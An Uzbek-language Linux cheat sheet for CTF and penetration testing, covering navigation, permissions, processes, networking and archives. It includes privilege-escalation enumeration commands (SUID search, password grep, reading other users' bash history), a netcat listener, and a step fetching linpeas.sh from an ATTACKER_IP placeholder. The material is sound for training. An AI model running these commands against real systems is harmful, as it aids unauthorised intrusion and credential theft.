# Linux Cheat Sheet

CTF va pentest'da eng ko‘p ishlatiladigan Linux buyruqlari.

## Navigatsiya va fayllar

| Buyruq                        | Vazifasi                                   |
| ----------------------------- | ------------------------------------------ |
| `pwd`                         | Joriy papka                                |
| `ls -la`                      | Barcha fayllar (yashirinlari bilan)        |
| `cd -`                        | Oldingi papkaga qaytish                    |
| `cat`, `less`, `head`, `tail` | Fayl o‘qish                                |
| `file <fayl>`                 | Fayl turini aniqlash (magic bytes)         |
| `strings <fayl>`              | Binary ichidagi o‘qiladigan matnlar        |
| `xxd <fayl> \| head`          | Hex ko‘rinish                              |
| `cp`, `mv`, `rm -r`, `mkdir -p` | Nusxa, ko‘chirish, o‘chirish, papka yaratish |

## Qidirish

```bash
find / -name "flag*" 2>/dev/null            # nom bo‘yicha
find / -type f -user root -perm -4000 2>/dev/null   # SUID fayllar
find / -writable -type d 2>/dev/null        # yozish mumkin bo‘lgan papkalar
grep -rni "password" /var/www 2>/dev/null   # fayllar ichidan matn
locate <nom>                                # tezkor (updatedb kerak)
which <buyruq>                              # buyruq qayerda
```

## Fayl ruxsatlari (permissions)

```text
-rwxr-xr--  1 user group  ...
 │  │  │
 │  │  └── others: r--  (4)
 │  └───── group:  r-x  (5)
 └──────── owner:  rwx  (7)   → chmod 754
```

| Qiymat | Ma'nosi         |
| ------ | --------------- |
| `r` = 4 | read            |
| `w` = 2 | write           |
| `x` = 1 | execute         |
| `s`    | SUID / SGID — fayl egasi huquqi bilan ishlaydi |
| `t`    | Sticky bit — faqat egasi o‘chira oladi (`/tmp`) |

```bash
chmod +x script.sh
chmod 600 id_rsa          # SSH private key uchun majburiy
chown user:group fayl
```

## Userlar va jarayonlar

```bash
id; whoami; groups
cat /etc/passwd | cut -d: -f1       # userlar ro‘yxati
sudo -l                             # sudo huquqlari
ps aux                              # barcha jarayonlar
ss -tulpn                           # ochiq portlar (netstat o‘rniga)
kill -9 <PID>
```

## Tarmoq

```bash
ip a                                # interfeyslar va IP
ip r                                # routing
curl -I http://<host>               # faqat header'lar
wget http://<host>/file
nc -lvnp 4444                       # listener
nc <host> <port>                    # ulanish
```

## Fayl uzatish (file transfer)

```bash
# Hujumchi mashinada:
python3 -m http.server 8000
# Target'da:
wget http://<ATTACKER_IP>:8000/linpeas.sh
curl http://<ATTACKER_IP>:8000/linpeas.sh -o /tmp/linpeas.sh
```

## Arxivlar va encoding

```bash
tar -xzf file.tar.gz        tar -czf out.tar.gz papka/
unzip file.zip              7z x file.7z
base64 -d <<< "ZmxhZw=="    echo -n "flag" | base64
echo -n "text" | md5sum     sha256sum fayl
```

## Foydali

- `history` — oldingi buyruqlar (boshqa userning `~/.bash_history` fayli ham qiziq bo‘lishi mumkin).
- `2>/dev/null` — xato xabarlarini yashirish.
- `Ctrl+R` — history bo‘yicha qidirish.
